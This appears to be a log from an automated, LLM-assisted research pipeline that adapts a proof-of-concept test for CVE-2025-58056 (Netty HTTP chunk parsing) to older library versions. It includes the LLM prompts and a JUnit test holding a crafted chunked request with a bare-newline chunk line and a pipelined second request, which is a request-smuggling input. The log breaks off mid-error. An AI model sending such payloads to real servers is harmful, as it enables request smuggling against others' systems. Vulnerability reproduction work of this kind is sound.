Running main_process.py for CVE: CVE-2025-58056
Versions: 4.0.56.Final, 4.0.0.CR3, 5.0.0.Alpha1

[1m[Main] === Starting adaptation process for CVE-2025-58056 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/io_netty_netty-codec-http.txt[0m
[96m[Analyzer] io.netty:netty-codec-http has 235 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['4.0.0.Beta1', '4.0.0.Beta2', '4.0.0.Beta3', '4.0.0.CR1', '4.0.0.CR2', '4.0.0.CR3', '4.0.0.CR4', '4.0.0.CR5', '4.0.0.CR6', '4.0.0.CR7', '4.0.0.CR8', '4.0.0.CR9', '4.0.0.Final', '4.0.1.Final', '4.0.2.Final', '4.0.3.Final', '4.0.4.Final', '4.0.5.Final', '4.0.6.Final', '4.0.7.Final', '4.0.8.Final', '4.0.9.Final', '4.0.10.Final', '4.0.11.Final', '4.0.12.Final', '4.0.13.Final', '4.0.14.Beta1', '4.0.14.Final', '4.0.15.Final', '4.0.16.Final', '4.0.17.Final', '4.0.18.Final', '4.0.19.Final', '4.0.20.Final', '4.0.21.Final', '4.0.22.Final', '4.0.23.Final', '4.0.24.Final', '4.0.25.Final', '4.0.26.Final', '4.0.27.Final', '4.0.28.Final', '4.0.29.Final', '4.0.30.Final', '4.0.31.Final', '4.0.32.Final', '4.0.33.Final', '4.0.34.Final', '4.0.35.Final', '4.0.36.Final', '4.0.37.Final', '4.0.38.Final', '4.0.39.Final', '4.0.40.Final', '4.0.41.Final', '4.0.42.Final', '4.0.43.Final', '4.0.44.Final', '4.0.45.Final', '4.0.46.Final', '4.0.47.Final', '4.0.48.Final', '4.0.49.Final', '4.0.50.Final', '4.0.51.Final', '4.0.52.Final', '4.0.53.Final', '4.0.54.Final', '4.0.55.Final', '4.0.56.Final', '5.0.0.Alpha1'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2025-58056[0m
[92m[Main] Total affected versions: 227[0m
[92m[Main] Already reproduced versions: 157[0m
[93m[Main] Versions pending adaptation: 70[0m
[96m[Main]     -> ['4.0.0.Beta1', '4.0.0.Beta2', '4.0.0.Beta3', '4.0.0.CR1', '4.0.0.CR2', '4.0.0.CR3', '4.0.0.CR4', '4.0.0.CR5', '4.0.0.CR6', '4.0.0.CR7', '4.0.0.CR8', '4.0.0.CR9', '4.0.0.Final', '4.0.1.Final', '4.0.2.Final', '4.0.3.Final', '4.0.4.Final', '4.0.5.Final', '4.0.6.Final', '4.0.7.Final', '4.0.8.Final', '4.0.9.Final', '4.0.10.Final', '4.0.11.Final', '4.0.12.Final', '4.0.13.Final', '4.0.14.Beta1', '4.0.14.Final', '4.0.15.Final', '4.0.16.Final', '4.0.17.Final', '4.0.18.Final', '4.0.19.Final', '4.0.20.Final', '4.0.21.Final', '4.0.22.Final', '4.0.23.Final', '4.0.24.Final', '4.0.25.Final', '4.0.26.Final', '4.0.27.Final', '4.0.28.Final', '4.0.29.Final', '4.0.30.Final', '4.0.31.Final', '4.0.32.Final', '4.0.33.Final', '4.0.34.Final', '4.0.35.Final', '4.0.36.Final', '4.0.37.Final', '4.0.38.Final', '4.0.39.Final', '4.0.40.Final', '4.0.41.Final', '4.0.42.Final', '4.0.43.Final', '4.0.44.Final', '4.0.45.Final', '4.0.46.Final', '4.0.47.Final', '4.0.48.Final', '4.0.49.Final', '4.0.50.Final', '4.0.51.Final', '4.0.52.Final', '4.0.53.Final', '4.0.54.Final', '4.0.55.Final', '4.0.56.Final'][0m
[96m[Main]     -> ['4.1.0.Beta1', '4.1.0.Beta2', '4.1.0.Beta3', '4.1.0.Beta4', '4.1.0.Beta5', '4.1.0.Beta6', '4.1.0.Beta7', '4.1.0.Beta8', '4.1.0.CR1', '4.1.0.CR2', '4.1.0.CR3', '4.1.0.CR4', '4.1.0.CR5', '4.1.0.CR6', '4.1.0.CR7', '4.1.0.Final', '4.1.1.Final', '4.1.2.Final', '4.1.3.Final', '4.1.4.Final', '4.1.5.Final', '4.1.6.Final', '4.1.7.Final', '4.1.8.Final', '4.1.9.Final', '4.1.10.Final', '4.1.11.Final', '4.1.12.Final', '4.1.13.Final', '4.1.14.Final', '4.1.15.Final', '4.1.16.Final', '4.1.17.Final', '4.1.18.Final', '4.1.19.Final', '4.1.20.Final', '4.1.21.Final', '4.1.22.Final', '4.1.23.Final', '4.1.24.Final', '4.1.25.Final', '4.1.26.Final', '4.1.27.Final', '4.1.28.Final', '4.1.29.Final', '4.1.30.Final', '4.1.31.Final', '4.1.32.Final', '4.1.33.Final', '4.1.34.Final', '4.1.35.Final', '4.1.36.Final', '4.1.37.Final', '4.1.38.Final', '4.1.39.Final', '4.1.40.Final', '4.1.41.Final', '4.1.42.Final', '4.1.43.Final', '4.1.44.Final', '4.1.45.Final', '4.1.46.Final', '4.1.47.Final', '4.1.48.Final', '4.1.49.Final', '4.1.50.Final', '4.1.51.Final', '4.1.52.Final', '4.1.53.Final', '4.1.54.Final', '4.1.55.Final', '4.1.56.Final', '4.1.57.Final', '4.1.58.Final', '4.1.59.Final', '4.1.60.Final', '4.1.61.Final', '4.1.62.Final', '4.1.63.Final', '4.1.64.Final', '4.1.65.Final', '4.1.66.Final', '4.1.67.Final', '4.1.68.Final', '4.1.69.Final', '4.1.70.Final', '4.1.71.Final', '4.1.72.Final', '4.1.73.Final', '4.1.74.Final', '4.1.75.Final', '4.1.76.Final', '4.1.77.Final', '4.1.78.Final', '4.1.79.Final', '4.1.80.Final', '4.1.81.Final', '4.1.82.Final', '4.1.83.Final', '4.1.84.Final', '4.1.85.Final', '4.1.86.Final', '4.1.87.Final', '4.1.88.Final', '4.1.89.Final', '4.1.90.Final', '4.1.91.Final', '4.1.92.Final', '4.1.93.Final', '4.1.94.Final', '4.1.95.Final', '4.1.96.Final', '4.1.97.Final', '4.1.98.Final', '4.1.99.Final', '4.1.100.Final', '4.1.101.Final', '4.1.102.Final', '4.1.103.Final', '4.1.104.Final', '4.1.105.Final', '4.1.106.Final', '4.1.107.Final', '4.1.108.Final', '4.1.109.Final', '4.1.110.Final', '4.1.111.Final', '4.1.112.Final', '4.1.113.Final', '4.1.114.Final', '4.1.115.Final', '4.1.116.Final', '4.1.117.Final', '4.1.118.Final', '4.1.119.Final', '4.1.120.Final', '4.1.121.Final', '4.1.122.Final', '4.1.123.Final', '4.1.124.Final', '4.2.0.Alpha1', '4.2.0.Alpha2', '4.2.0.Alpha3', '4.2.0.Alpha4', '4.2.0.Alpha5', '4.2.0.Beta1', '4.2.0.RC1', '4.2.0.RC2', '4.2.0.RC3', '4.2.0.RC4', '4.2.0.Final', '4.2.1.Final', '4.2.2.Final', '4.2.3.Final', '4.2.4.Final', '5.0.0.Alpha1', '5.0.0.Alpha2'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2025-58056/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.56.Final[0m
[96m[Selector] Closest reproduced version: 4.1.0.Beta1 at index 78[0m
[96m[Adapter] Trying next closest version: 4.0.56.Final[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2025-58056/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.56.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.56.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.56.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.56.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.56.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.56.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 4.1.0.Beta1 to 4.0.56.Final...[0m
[96m[Adapter] Start adapting exploit from 4.1.0.Beta1 to 4.0.56.Final"[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 16 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,50] incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable request of type io.netty.handler.codec.http.HttpRequest[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[44,50] incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpContent[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2255 (prompt), 1 (completion), 2256 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.56.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.1.0.Beta1.

Your task is to:
1. Analyze why this issue occurs with the *4.1.0.Beta1* but not with the *4.0.56.Final version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,50] incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol
  symbol:   method decoderResult()
  location: variable request of type io.netty.handler.codec.http.HttpRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[44,50] incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpContent
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol
  symbol:   method decoderResult()
  location: variable content of type io.netty.handler.codec.http.HttpContent
[INFO] 4 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.098 s
[INFO] Finished at: 2025-09-25T05:57:48Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,50] incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol
[ERROR]   symbol:   method decoderResult()
[ERROR]   location: variable request of type io.netty.handler.codec.http.HttpRequest
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[44,50] incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpContent
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol
[ERROR]   symbol:   method decoderResult()
[ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.56.Final</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest |': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 40, 'column': 50, 'message': 'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest', 'symbol': None, 'location': None, 'code_line': '        HttpRequest request = channel.readInbound();'}], 'cannot find symbol | method decoderResult()': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 41, 'column': 28, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable request of type io.netty.handler.codec.http.HttpRequest', 'code_line': '        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.'}, {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 45, 'column': 46, 'message': 'cannot find symbol', 'symbol': 'method decoderResult()', 'location': 'variable content of type io.netty.handler.codec.http.HttpContent', 'code_line': '        DecoderResult decoderResult = content.decoderResult();'}], 'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpContent |': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 44, 'column': 50, 'message': 'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpContent', 'symbol': None, 'location': None, 'code_line': '        HttpContent content = channel.readInbound();'}]}
[LLMClient] Tokens used: 151 (prompt), 7 (completion), 158 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.56.Final: 

Error: incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest, None, None 

The test executes as expected in 4.1.0.Beta1 

Error code:         HttpRequest request = channel.readInbound(); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
HttpRequest;channel.readInbound
[96m[ErrorManager] Extracted key entities: ['HttpRequest', 'channel.readInbound'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 40, 'column': 50, 'message': 'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest', 'symbol': None, 'location': None, 'code_line': '        HttpRequest request = channel.readInbound();'} with cause: ['HttpRequest', 'channel.readInbound'][0m
[96m[Adapter] Related diffs for error: [(714, 8.0), (716, 8.0), (717, 8.0), (255, 4.0), (393, 4.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest | cause: ['HttpRequest', 'channel.readInbound'][0m
[96m[RepairModule] Trying best diff #714 with score 8.00[0m
[LLMClient] Tokens used: 888 (prompt), 455 (completion), 1343 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.56.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.1.0.Beta1.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.1.0.Beta1 to 4.0.56.Final.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest, symble: None, location: None

### Error Position:
        HttpRequest request = channel.readInbound();

### Related Diff:
Operation: MODIFIED, File: codec-http/src/test/java/io/netty/handler/codec/http/HttpRequestDecoderTest.java, Hunk: @@ -71,10 +72,10 @@ public void testDecodeWholeRequestAtOnceMixedDelimiters() {
     private static void testDecodeWholeRequestAtOnce(byte[] content) {
         EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
         assertTrue(channel.writeInbound(Unpooled.wrappedBuffer(content)));
+        HttpRequest req = (HttpRequest) channel.readInbound();
-        HttpRequest req = channel.readInbound();
         assertNotNull(req);
         checkHeaders(req.headers());
+        LastHttpContent c = (LastHttpContent) channel.readInbound();
-        LastHttpContent c = channel.readInbound();
         assertEquals(CONTENT_LENGTH, c.content().readableBytes());
         assertEquals(
                 Unpooled.wrappedBuffer(content, content.length - CONTENT_LENGTH, CONTENT_LENGTH),

### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = channel.readInbound();
        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = channel.readInbound();
        DecoderResult decoderResult = content.decoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}



[LLMClient] Response: 
```java
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.decoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.decoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 14 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable request of type io.netty.handler.codec.http.HttpRequest[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | method decoderResult()', 'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpContent |', 'incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest |'}
[RepairModule] New grouped keys: {'cannot find symbol | method decoderResult()'}
[92m[RepairModule] Error incompatible types: java.lang.Object cannot be converted to io.netty.handler.codec.http.HttpRequest resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.56.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 14 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,28] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable request of type io.netty.handler.codec.http.HttpRequest[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.56.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[45,46] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method decoderResult()[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable content of type io.netty.handler.codec.http.HttpContent[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
